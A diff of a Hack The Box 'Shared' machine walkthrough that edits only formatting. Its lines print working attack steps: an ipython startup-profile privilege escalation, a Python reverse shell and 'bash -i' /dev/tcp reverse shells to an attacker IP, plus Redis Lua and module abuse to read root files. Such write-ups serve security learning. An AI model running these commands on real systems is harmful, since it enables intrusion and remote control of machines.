@@ -167,7 +167,7 @@ This version has multiple vulnerabilities. These are two of the most promising:
 
 - CVE-2020-4074: In PrestaShop from version 1.5.0.0 and before version 1.7.6.6, the authentication system is malformed and an attacker is able to forge requests and execute admin commands. The problem is fixed in 1.7.6.6.
 
-- CVE-2021-43789: PrestaShop is an Open Source e-commerce web application. Versions of PrestaShop prior to 1.7.8.2 are vulnerable to blind SQL injection using search filters with `orderBy` and `sortOrder` parameters. The problem is fixed in version 1.7.8.2.
+- CVE-2021-43789: PrestaShop is an Open Source e-commerce web application. Versions of PrestaShop prior to 1.7.8.2 are vulnerable to blind SQL injection using search filters with _orderBy_ and _sortOrder_ parameters. The problem is fixed in version 1.7.8.2.
 
 
 Since it makes special focus on the new checkout, I want to test it first, then check the rest of findings. I added a shirt to the cart and when to the checkout then, the host header on the requests showed **checkout.shared.htb**. So add it to the /etc/hosts.
@@ -292,7 +292,7 @@ In [crackstation](https://crackstation.net/) we obtain the password:
 First try was james and james_mason into SSH. The last one got me into the machine.
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/shared/4_0_in.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/shared/4_0_in.png" width="65%"/>
 </p>
 
 
@@ -337,14 +337,14 @@ Looking for privesc on that ipython, we could see the following [cybersecurity-h
 From the PoC:
 
 User1:
-```
+```bash
 mkdir -m 777 /tmp/profile_default
 mkdir -m 777 /tmp/profile_default/startup
 echo 'print("stealing your private secrets")' > /tmp/profile_default/startup/foo.py
 ```
 
 User2:
-```
+```bash
 cd /tmp
 ipython
 ```
@@ -360,20 +360,20 @@ stealing your private secrets
 We have rights to create files in that /opt/scripts_review/ folder, therefore, let's create a revshell:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/shared/4_2_perm.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/shared/4_2_perm.png" width="65%"/>
 </p>
 
 
 ```bash
 mkdir -m 777 /opt/scripts_review/profile_default
 mkdir -m 777 /opt/scripts_review/profile_default/startup
-echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.80",5454));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' > /opt/scripts_review/profile_default/startup/foo.py
-
+echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.80",5454));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' 
+  > /opt/scripts_review/profile_default/startup/foo.py
 ```
 And we got the revshell as **dan_smith**, we can get the flag:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/shared/5_0_user.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/shared/5_0_user.png" width="80%"/>
 </p>
 
 ``` 256adbed9f0b9323bd2e514b0dbecafc ```
@@ -488,7 +488,7 @@ Then we can use the password (we have no user) to get a cli. Once in the CLI I s
 ```bash
 eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /root/root.txt", "r"); local res = f:read("*a"); f:close(); return res' 0
 
-Tried the reverse but didnt worked
+# Tried the reverse but didnt worked out
 
 eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("bash -i &> /dev/tcp/10.10.14.112/5454 0>&1","r"); local res = f:read("*a"); f:close(); return res' 0
 ```
@@ -496,7 +496,7 @@ eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "
 And we get the root flag:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/shared/7_0_root.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/shared/7_0_root.png" width="95%"/>
 </p>
 
 We can also get a revshell. Trying to insert it into the io.popen function didn't work out, so I tried other method published on HackTricks, using [this GitHub repo](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand). Essetially it is a module that you can load on redis and it will execute commands. Just make the module and upload it to the box. Run redis-cli, use the password, load the module and execute your revshell:
@@ -508,9 +508,9 @@ OK
 127.0.0.1:6379> MODULE LOAD /home/dan_smith/module.so
 OK
 127.0.0.1:6379> system.exec "bash -c 'bash -i &> /dev/tcp/10.10.14.112/5454 0>&1'"
-``
+```
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/shared/7_2_rev.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/shared/7_2_rev.png" width="95%"/>
 </p>
 
